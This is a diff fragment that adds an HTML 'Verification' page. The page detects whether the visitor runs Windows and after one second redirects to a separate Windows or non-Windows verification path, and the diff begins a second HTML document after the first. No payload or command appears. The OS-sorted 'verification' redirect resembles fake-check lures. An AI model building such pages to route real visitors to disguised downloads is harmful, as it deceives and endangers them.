@@ -5,6 +5,32 @@
   <title>Verification</title>
   <style>
     body { background:#111;color:#fff;font-family:sans-serif;text-align:center;padding:40px;}
+    h2 { margin-bottom: 20px; }
+  </style>
+</head>
+<body>
+  <h2>Redirecting to correct verification...</h2>
+  <p id="info"></p>
+  <script>
+    const isWindows = navigator.userAgent.includes("Windows");
+    document.getElementById("info").innerText = `Detected OS: ${isWindows ? 'Windows' : 'Other'}`;
+    setTimeout(() => {
+      if (isWindows) {
+        window.location.href = "/verify-windows";
+      } else {
+        window.location.href = "/verifynotwindows";
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verification</title>
+  <style>
+    body { background:#111;color:#fff;font-family:sans-serif;text-align:center;padding:40px;}
     button { padding:10px 20px;border:none;border-radius:8px;background:#007bff;color:#fff;font-weight:bold;cursor:pointer;margin:10px;}
     button:hover { background:#0056b3;}
   </style>
